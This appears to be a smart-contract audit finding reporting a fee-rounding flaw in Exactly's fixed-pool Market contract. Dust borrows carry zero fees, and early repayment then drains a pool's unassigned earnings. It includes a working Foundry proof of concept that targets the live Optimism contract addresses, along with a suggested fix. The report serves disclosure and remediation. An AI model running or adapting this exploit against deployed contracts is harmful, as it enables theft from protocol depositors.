Itchy Candy Bat

high

# Theft of unassigned earnings from a fixed pool

## Summary

An attacker can borrow a dust amount from a fixed pool to round down the fee to zero, repeating this thousands of times the attacker will get a big fixed loan with 0 fees. If that loan is repaid early, the amount repaid will be lower than the borrowed amount, effectively stealing funds from the unassigned earnings of that fixed pool.

## Vulnerability Detail

When a user takes a loan from a fixed pool, the resulting fee is rounded down. An attacker can use this feature to borrow a dust amount from a fixed pool thousands of times to end up with a big fixed loan with 0 fees. 

The fee is calculated here:

https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L320
```solidity
fee = assets.mulWadDown(fixedRate.mulDivDown(maturity - block.timestamp, 365 days));
```

When the borrowed assets are really low, the resulting fee will be rounded down to zero. This by itself is already an issue, but an attacker can use this loan to steal funds from the unassigned earnings.

When a fixed loan is repaid early, it can get a discount that is calculated as if the repaid amount was deposited into that fixed pool. The discount depends on the unassigned earnings of the pool and the proportion that the repaid amount represents in the total fixed debt backed by the floating pool.

When the attacker repays this loan with no interest, he's going to get a discount based on the current unassigned earnings of that pool. This discount will make the attacker repay less funds than he originally borrowed, and those funds will be subtracted from the unassigned earnings of that pool.

## Impact

An attacker can steal the unassigned earnings from a fixed pool. 

## PoC

The following PoC executes this attack on the live contracts of Exactly in the Optimism chain. The test can be pasted into a new file within a forge environment. Also, the `.env` file must include the variable `OPTIMISM_RPC_URL` for the test to run. The test can be executed with the following command:

```solidity
forge test --match-test test_steal_unassigned_earnings --evm-version cancun
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Market} from "protocol/contracts/Market.sol";
import {FixedLib} from "protocol/contracts/utils/FixedLib.sol";
import {Test} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract TestMarket is Test {
    Market marketUSDC = Market(0x81C9A7B55A4df39A9B7B5F781ec0e53539694873);
    Market marketWBTC = Market(0x6f748FD65d7c71949BA6641B3248C4C191F3b322);

    IERC20 usdc = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);
    IERC20 wbtc = IERC20(0x68f180fcCe6836688e9084f035309E29Bf0A2095);

    uint256 public optimismFork;
    string OPTIMISM_RPC_URL = vm.envString("OPTIMISM_RPC_URL");

    function setUp() public {
        optimismFork = vm.createSelectFork(OPTIMISM_RPC_URL);
        assertEq(optimismFork, vm.activeFork());
    }

    function test_steal_unassigned_earnings() public {
        vm.rollFork(119348257); // Abr 28
        uint256 maturity = 1722470400; // Aug 01
        uint256 liquidity = 100_000e6;
        uint256 borrowAmount = 1e8;

        // Simulate some fixed rate borrows on the WBTC market
        deal(address(usdc), address(this), liquidity);
        usdc.approve(address(marketUSDC), liquidity);
        marketUSDC.deposit(liquidity, address(this));
        marketUSDC.auditor().enterMarket(marketUSDC);
        marketWBTC.borrowAtMaturity(
            maturity,
            borrowAmount,
            type(uint256).max,
            address(this),
            address(this)
        );

        // Attacker deposits liquidity and borrows from the same pool
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);
        deal(address(wbtc), attacker, 1e8);
        wbtc.approve(address(marketWBTC), type(uint256).max);
        marketWBTC.deposit(1e8, attacker);

        // Attacker borrows a tiny amount to round the fee to 0
        // Doing it lots of times you end up with a big loan with a fee of 0
        for (uint i = 0; i < 20_000; i++) {
            marketWBTC.borrowAtMaturity(
                maturity,
                190,
                type(uint256).max,
                attacker,
                attacker
            );
        }

        (uint256 principal, uint256 fee) = marketWBTC.fixedBorrowPositions(
            maturity,
            attacker
        );

        assertEq(principal, 0.038e8); // Loan of 0.038 WBTC (~2400 USD)
        assertEq(fee, 0);

        // Repay all the loan
        uint256 actualRepayAssets = marketWBTC.repayAtMaturity(
            maturity,
            type(uint256).max,
            type(uint256).max,
            attacker
        );

        assertEq(actualRepayAssets, 0.03786283e8); // Repay 0.037 WBTC

        assertGt(principal, actualRepayAssets); // The attacker has repaid the loan of 0.038 WBTC with 0.037 WBTC
    }
}
```

## Code Snippet

https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L320

## Tool used

Manual Review

## Recommendation

To mitigate this issue is recommended to not allow borrows with 0 fees from fixed pools. Here is a possible implementation of the fix:

```diff
    fee = assets.mulWadDown(fixedRate.mulDivDown(maturity - block.timestamp, 365 days));
+   require(fee > 0);
```
